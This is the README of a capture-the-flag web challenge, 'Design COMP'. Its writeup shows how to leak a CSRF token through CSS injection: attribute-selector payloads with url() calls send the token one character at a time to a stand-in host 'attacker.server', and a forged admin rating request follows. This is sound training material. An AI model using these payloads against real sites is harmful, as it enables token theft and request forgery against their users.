# Design COMP

**Category:** Web

**Difficulty:** Hard

**Author:** todo#7331

_Come join our homepage design competition and test out your CSS skills!_

## Description
Application asks participant to design a home page using CSS. The site exposes a playground which allows the player to 
inject arbitrary css. There is a form input on this page with a csrf token. Players may make submissions by submitting
links to the admin.

By leveraging a CSS Injection to leak the CSRF token, immediately followed by a CSRF, players can gain full marks for their submission and get the flag.

## Writeup
_The core solve can be found in solve/server.py_

1. We notice that playground will set whatever css is messaged to it regardless of origin.
2. We notice there is a CSRF token in the playground.
3. We construct a site which will post CSS (as described below) in order to leak the CSRF token.
  - Using CSS's attribute selectors we can match parts of the CSRF token. I.e. `[value^="ab"]` will match tags with values starting with `ab` and `[value$="ab"]` will match those ending with `ab`.
  - The `url()` function allows us to make outbound http calls from CSS in order to leak values over a side channel
  - We can this construct a payload that looks like `[name="csrf"][value^="a"] {background: url(http://attacker.server/Aa} }`, which will make a http request to `/Aa` if the value of the csrf input begins with `a`. and thus leak the first character
  - Next we would send `...[value^="ab"] { background: url(.../Aab) }` to find the second character, etc.
  - In order for background to render correctly we will need to set `#rater,#rater *{display: block !important}`.
  - However as the csrf input is hidden, styling will not render on it, meaning `[name="csrf"][value^="a"]{background:url(http://attacker.server)}` will not actually make an outbound request. In order to combat this, we can instead just target an adjacent sibling node (`[name="csrf"][value^="a"]~p{...}`).
4. We are able to open the site either through an iframe (given that our site is hosted on https), or by using window.open. We can then `postMessage` to send CSS to it.
5. Once we have the CSRF token we can then make a csrf request to `/admin/rate` set our score to 10.
6. This presents us with out flag.

## Running
### Configuration
A little bit of configuration is required prior to running the challenge. This can be configured through the
`chal/meta/env` file.
 - The `RECAPTCHA_SITE_KEY` and `RECAPTCHA_SECRET_KEY` need to be set to valid ReCaptcha v2 keys
 - The `EXTERNAL_HOST` should be set to the external host and port of the site. Whilst it can be left blank, this will make it possible for players to do a host spoof if the challenge is run with a dedicated IP.

### Running
The challenge can be run with `docker-compose up`
